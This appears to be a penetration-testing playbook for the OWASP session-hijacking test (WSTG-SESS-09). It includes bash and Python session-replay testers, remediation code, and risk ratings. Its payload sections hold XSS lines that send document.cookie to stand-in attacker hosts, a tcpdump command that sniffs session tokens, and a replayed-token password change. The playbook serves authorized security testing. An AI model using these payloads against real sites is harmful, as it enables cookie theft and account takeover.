---
name: wstg-sess-09
description: "Testing for Session Hijacking"
category: session-management
owasp_id: WSTG-SESS-09
version: "1.0.0"
author: cyberstrike-official
tags: [session, cookies, csrf, token, wstg, sess]
tech_stack: []
cwe_ids: [CWE-384]
chains_with: [wstg-sess-02, wstg-sess-07]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-sess-02: "Confirmed hijacking is directly enabled by missing HttpOnly/Secure flags — the cookie is stealable via XSS or network sniffing with no additional attack needed (High)"
  wstg-sess-07: "Confirmed session hijacking + no timeout enforcement = a stolen token stays valid indefinitely, giving unlimited time to exploit or monetize access (High)"
---

# wstg-sess-09

## Test ID

WSTG-SESS-09

## Test Name

Testing for Session Hijacking

## High-Level Description

Session hijacking occurs when an attacker obtains a valid session token through various means (sniffing, XSS, prediction) and uses it to impersonate the legitimate user. This test evaluates the application's resilience against session hijacking attacks and the effectiveness of protective measures.

---

## What to Check

- [ ] Token transmission security (HTTPS)
- [ ] Token exposure vectors (XSS, logs)
- [ ] Session binding (IP, User-Agent)
- [ ] Concurrent session detection
- [ ] Session token predictability
- [ ] Re-authentication for sensitive operations

---

## How to Test

### Step 1: Test Session Token Theft via XSS

```bash
# If XSS exists, test cookie accessibility
# Inject and observe if session cookie is captured

# XSS payload for cookie theft
# <script>document.location='https://attacker.com/?c='+document.cookie</script>

# Check HttpOnly flag
curl -sI "https://target.com" | grep -i "set-cookie" | grep -i "httponly"
```

### Step 2: Test Session Token Reuse

```bash
#!/bin/bash
TARGET="https://target.com"

# Capture valid session from User A
session_a=$(curl -s -c - -X POST "$TARGET/login" \
    -d "username=usera&password=passa" | grep -oP "SESSIONID=\K[^;]+")

# Use session from different network/machine
# Simulate different User-Agent
response=$(curl -s -b "SESSIONID=$session_a" \
    -H "User-Agent: Different-Browser/1.0" \
    "$TARGET/dashboard")

if echo "$response" | grep -q "Welcome"; then
    echo "[WARN] Session accepted from different User-Agent"
fi
```

### Step 3: Session Hijacking Tester

```python
#!/usr/bin/env python3
import requests

class SessionHijackingTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_session_reuse_different_context(self, login_creds):
        """Test if session works from different context"""
        print("[*] Testing session reuse from different context...")

        # Get legitimate session
        session1 = requests.Session()
        session1.post(f"{self.base_url}/login", data=login_creds)

        session_cookie = None
        for cookie in session1.cookies:
            if 'session' in cookie.name.lower():
                session_cookie = cookie.value
                break

        if not session_cookie:
            print("[!] No session cookie found")
            return

        # Use session from "different" context
        session2 = requests.Session()
        session2.headers['User-Agent'] = 'DifferentBrowser/1.0'
        session2.cookies.set('SESSIONID', session_cookie)

        response = session2.get(f"{self.base_url}/dashboard")

        if response.status_code == 200 and 'login' not in response.url.lower():
            print("[WARN] Session accepted from different User-Agent")
            print("       Consider implementing session binding")
        else:
            print("[OK] Session binding in place")

    def test_concurrent_sessions(self, login_creds):
        """Test concurrent session handling"""
        print("\n[*] Testing concurrent sessions...")

        # Login from two sessions
        session1 = requests.Session()
        session2 = requests.Session()

        session1.post(f"{self.base_url}/login", data=login_creds)
        session2.post(f"{self.base_url}/login", data=login_creds)

        # Check if both sessions work
        r1 = session1.get(f"{self.base_url}/dashboard")
        r2 = session2.get(f"{self.base_url}/dashboard")

        both_work = (r1.status_code == 200 and r2.status_code == 200)

        if both_work:
            print("[INFO] Multiple concurrent sessions allowed")
        else:
            print("[OK] Previous session invalidated on new login")

    def test_reauthentication(self, login_creds, sensitive_action):
        """Test if sensitive operations require re-authentication"""
        print("\n[*] Testing re-authentication for sensitive operations...")

        session = requests.Session()
        session.post(f"{self.base_url}/login", data=login_creds)

        # Try sensitive action without re-auth
        response = session.post(f"{self.base_url}{sensitive_action}")

        if response.status_code == 200:
            print("[WARN] Sensitive action allowed without re-authentication")
            self.findings.append({
                "issue": "No re-auth for sensitive operations",
                "severity": "Medium"
            })

# Usage
tester = SessionHijackingTester("https://target.com")
tester.test_session_reuse_different_context({"username": "test", "password": "test"})
tester.test_concurrent_sessions({"username": "test", "password": "test"})
tester.test_reauthentication({"username": "test", "password": "test"}, "/api/change-password")
```

---

## Tools

| Tool                | Description               | Usage                                   |
| --------------------- | --------------------------- | ------------------------------------------ |
| **Wireshark / tcpdump**| Traffic sniffing            | Confirm token exposure over unencrypted transport |
| **Burp Suite**       | Proxy/Repeater               | Replay captured tokens from another context |
| **mitmproxy**        | MITM interception            | Simulate network-level session theft     |
| **jwt_tool**         | JWT-specific hijack testing  | Reuse/tamper JWT session tokens          |

---

## Example Commands/Payloads

```bash
# Capture a session, then replay it with a different User-Agent/IP context
SESSION=$(curl -s -c - -X POST "https://{target}/login" -d "username=usera&password=passa" | grep -oP "SESSIONID=\K[^;]+")
curl -s -b "SESSIONID=$SESSION" -H "User-Agent: Totally-Different-Client/9.0" \
    "https://{target}/dashboard" | grep -qi "welcome" \
    && echo "[WARN] Session accepted from unrelated User-Agent (no binding)"

# XSS-based cookie exfiltration payload (use only where XSS is confirmed/authorized)
# <script>fetch('https://attacker.example/c?'+document.cookie)</script>
curl -s "https://{target}/search?q=<script>fetch('https://attacker.example/c?'+document.cookie)</script>"

# Confirm HttpOnly is set (mitigates the above)
curl -sI "https://{target}/" | grep -i "set-cookie" | grep -io "httponly"

# Sniff for session tokens sent over plaintext HTTP
sudo tcpdump -A -i eth0 host {target} and port 80 | grep -iE "sessionid|cookie:"

# Test if sensitive action succeeds without re-authentication using a hijacked/replayed token
curl -s -X POST "https://{target}/api/change-password" \
    -b "SESSIONID=$SESSION" -d "new_password=pwned123"
```

---

## Remediation Guide

### Session Binding

```python
import hashlib
from flask import session, request, abort

@app.before_request
def validate_session_binding():
    if 'user_id' not in session:
        return

    # Check User-Agent binding
    current_ua = hashlib.sha256(
        request.headers.get('User-Agent', '').encode()
    ).hexdigest()

    if session.get('user_agent_hash') != current_ua:
        session.clear()
        abort(401)

@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form):
        session['user_id'] = user.id
        session['user_agent_hash'] = hashlib.sha256(
            request.headers.get('User-Agent', '').encode()
        ).hexdigest()
        return redirect('/dashboard')
```

### Re-authentication for Sensitive Operations

```python
@app.route('/change-password', methods=['POST'])
@require_auth
@require_reauth  # Custom decorator that checks for recent password entry
def change_password():
    # Process password change
    pass
```

---

## Risk Assessment

| Finding                      | CVSS | Severity |
| ---------------------------- | ---- | -------- |
| No session binding           | 5.3  | Medium   |
| No re-auth for sensitive ops | 5.3  | Medium   |
| Session accessible via XSS   | 7.5  | High     |

---

## CWE Categories

| CWE ID      | Title                   |
| ----------- | ----------------------- |
| **CWE-384** | Session Fixation        |
| **CWE-287** | Improper Authentication |

---

## References

- [OWASP WSTG - Testing for Session Hijacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)


---

## Checklist

```
[ ] Token theft vectors tested
[ ] Session reuse tested
[ ] Session binding evaluated
[ ] Concurrent sessions tested
[ ] Re-authentication tested
[ ] Findings documented
```
